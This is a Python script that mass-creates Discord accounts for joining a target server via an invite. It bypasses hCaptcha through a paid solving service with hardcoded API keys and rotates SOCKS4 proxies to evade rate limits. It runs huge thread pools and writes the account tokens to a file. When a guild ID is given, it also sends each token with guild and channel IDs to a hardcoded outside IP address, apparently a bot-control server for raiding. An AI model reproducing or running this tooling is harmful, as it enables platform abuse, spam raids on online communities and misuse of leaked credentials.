from requests import post
from random import choice
from secrets import token_hex
from string import ascii_letters
from time import sleep as sp,time
from concurrent.futures import ThreadPoolExecutor as tp

#key = "c963251deef52cd12b8e96843d3ff128" #serross
key = "91b4e564d4ef5b7d58a240d2058d0692" #larina
#key = "4eee11338ded796f167780743e537a23" #theniceday
ec=tp(max_workers=int(100000))
f=None
proxy_list=list()
proxy_num=0
proxy_name=["socks4_100ms_1k.txt","socks4_nice.txt","socks4_a.txt"]
for pn in proxy_name:
    proxy_list.extend(open(pn, encoding='utf-8').readlines())

def register(captcha, invite):
    runn = True
    username = f"0x99a {''.join([choice(ascii_letters) for _ in range(3)])}"
    data = {
        "captcha_key": captcha,
        "consent": True,
        "fingerprint": "",
        "gift_code_sku_id": None,
        "invite": invite,
        "username": username
    }
    while runn:
        p = f"socks4://{choice(proxy_list)}" # pip install pysocks
        try:
            textres = post("https://discord.com/api/v9/auth/register", proxies={"https": p},headers=headers, json=data, timeout=3).json()
            token = textres["token"]
            print(f"[token gen] username : {username} token : {token[:35]}...")
            if gi != "0":
                try :
                    post(f"http://185.117.3.23:4378/?token={token}&guild={gi}&chid={ci}", timeout=3)
                except:
                    pass
            f.write(f"{token}\n")
            f.flush()
            runn = False
        except :# Exception as e
            try :
                if token:
                    break
            except:
                pass
            try:
                textres['captcha_key']
                break
            except:
                pass
            '''
            try :
                print(f"[token gen] fail to gen token | {textres}")
            except:
                print("[token gen] fail to gen token | i thing proxy")
            '''

def reg(invite,tt):
    c=post('http://api.capmonster.cloud/createTask', json={"clientKey":key,"task":{"type":"HCaptchaTaskProxyless","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.73","websiteURL":f"https://discord.com/invite/{invite}","websiteKey":"f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"}}).json()['taskId']
    sp(0.5)
    while True:
        d = post('http://api.capmonster.cloud/getTaskResult', json={"clientKey":key, 'taskId': c}).json()
        if d['status'] == 'ready':
            print("[captcha] ok")
            while True:
                #print(d)
                if tt <= int(time()):
                    break
                sp(0.5)
            register(d['solution']['gRecaptchaResponse'],invite)
            break


gi=input("guild id : ")
ci=input("chid : ")
i=input("invite : ")
j=input("amount of bot : ")
t=input("join in (sec) : ")

'''
gi="876894282450092052"
ci="876894282898874448"
i="HgsqRG92"
j="1"
t="0"
'''
'''
gi="867115168936886312"
ci="883178493142237215"
i="ZrN4uEcAQW"
j="1"
t="0"
'''
gi="0"
ci="0"
i="X4nh4ASzWJ"
j="1"
t="0"
f = open(f"token_{i}.txt", "a+")
tt=int(time()+int(t))
headers = {"cookie": "OptanonConsent=version=6.17.0; locale=en","referrer": f"https://discord.com/invite/{i}","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMzEgU2FmYXJpLzUzNy4zNiBFZGcvOTIuMC45MDIuNzMiLCJicm93c2VyX3ZlcnNpb24iOiI5Mi4wLjQ1MTUuMTMxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInNlYXJjaF9lbmdpbmUiOiJnb29nbGUiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTQyOTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.73"}
for b in range(int(j)):
    #reg(i,tt)
    ec.submit(reg,i,tt)
    if b > 500 or b > 1000 or b > 1500 or b > 2000 or b > 2500 or b > 3000:
        print("[main] sleep 5 sec")
        sp(5)